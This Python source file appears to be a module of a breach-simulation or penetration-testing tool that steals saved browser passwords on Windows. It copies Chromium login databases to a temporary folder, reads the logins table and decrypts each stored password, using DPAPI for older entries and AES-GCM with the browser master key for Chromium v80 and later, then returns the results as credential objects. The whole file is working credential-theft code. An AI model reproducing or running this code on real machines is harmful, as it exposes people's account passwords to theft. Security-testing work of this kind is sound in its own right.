import logging
import shutil
import sqlite3
import string
import tempfile
from pathlib import Path
from typing import Collection, List, Optional, Tuple

from Crypto.Cipher import AES

from common.credentials import Credentials, Password, Username
from common.types import Event
from common.utils.code_utils import secure_generate_random_string

from .browser_credentials_database_path import BrowserCredentialsDatabasePath
from .windows_decryption import win32crypt_unprotect_data

logger = logging.getLogger(__name__)


class WindowsCredentialsDatabaseProcessor:
    def __call__(
        self, interrupt: Event, database_paths: Collection[BrowserCredentialsDatabasePath]
    ) -> Collection[Credentials]:
        credentials = []

        # TODO: make interruptible
        for database_path in database_paths:
            # copy database before querying it to bypass lock errors
            temporary_database_path = self._copy_database(database_path.database_file_path)
            if temporary_database_path:
                try:
                    credentials.extend(
                        self._export_credentials(
                            temporary_database_path=temporary_database_path,
                            master_key=database_path.master_key,
                        )
                    )
                except Exception as err:
                    logger.debug(f"{err}")

                self._remove_temporary_database(temporary_database_path)

        return [
            # TODO: fix assumption that identity is a username, could be an email ID;
            #       or just let it be, anything that uses a `Username` which is actually
            #       an email ID will just fail and move on
            Credentials(identity=Username(username=username), secret=Password(password=password))
            for username, password in set(credentials)
        ]

    def _copy_database(self, database_path: Path) -> Optional[Path]:
        root_dir = [
            tempfile.gettempdir(),
            # NOTE: (This is not relevant ATM since we only steal credentials from
            # the current user, but leave this comment here for future reference.)
            # Using user tempfile will produce an error when impersonating users
            # (permission denied). Use a public directory in that case (uncomment the following):
            # os.environ.get("PUBLIC", None),
            # os.environ.get("SystemDrive", None) + "\\",
        ]
        random_name = secure_generate_random_string(n=9, character_set=string.ascii_lowercase)

        for r in root_dir:
            try:
                temp_path = Path(r) / Path(random_name)
                shutil.copy(database_path, temp_path)

                logger.debug(
                    f'Copied database at "{database_path}" to temporary location "{temp_path}"'
                )

                return temp_path
            except Exception as err:
                logger.error(
                    "Encountered an exception while trying to copy database "
                    f'at "{database_path}" to temporary location "{temp_path}": {err}'
                )

        return None

    def _export_credentials(
        self, temporary_database_path: Path, master_key: Optional[bytes] = None
    ) -> List[Tuple[str, str]]:
        """
        Exports credentials from the given database
        """

        database_query = "SELECT username_value, password_value FROM logins"

        credentials: List[Tuple[str, str]] = []

        try:
            conn = sqlite3.connect(temporary_database_path)
        except Exception as err:
            logger.error(f"Encountered an exception while connecting to database: {err}")
            return credentials

        cursor = conn.cursor()
        try:
            cursor.execute(database_query)
        except Exception as err:
            logger.error(f"Encountered an exception while executing query on database: {err}")
            return credentials

        for username, password in cursor.fetchall():
            try:
                # decrypt the password
                if password and password.startswith(b"v10"):  # chromium > v80
                    if master_key:
                        password = self._decrypt_password_v80(password, master_key)
                else:
                    try:
                        password_bytes = win32crypt_unprotect_data(password)
                    except Exception:
                        password_bytes = None

                    if password_bytes not in [None, False]:
                        password = password_bytes.decode("utf-8")

                if not username and not password:
                    continue

                credentials.append((username, password))

            except Exception as err:
                logger.error(
                    f"Encountered an exception while trying to decrypt the password: {err}"
                )

                # even if the password couldn't be decrypted, we don't want to lose the username
                credentials.append((username, ""))

        conn.close()

        return credentials

    def _decrypt_password_v80(self, encrypted_password: str, master_key: bytes) -> str:
        """
        Decrypts passwords stolen from browsers with Chromium > v80
        """

        iv = encrypted_password[3:15]
        payload = encrypted_password[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)

        decrypted_pass = cipher.decrypt(payload)
        decrypted_pass = decrypted_pass[:-16].decode()  # remove suffix bytes

        return decrypted_pass

    def _remove_temporary_database(self, temporary_database_path: Path):
        try:
            temporary_database_path.unlink()
            logger.debug(f'Removed temporary database file located at "{temporary_database_path}"')
        except FileNotFoundError:
            logger.error(
                f'Could not remove temporary database file located at "{temporary_database_path}"'
            )
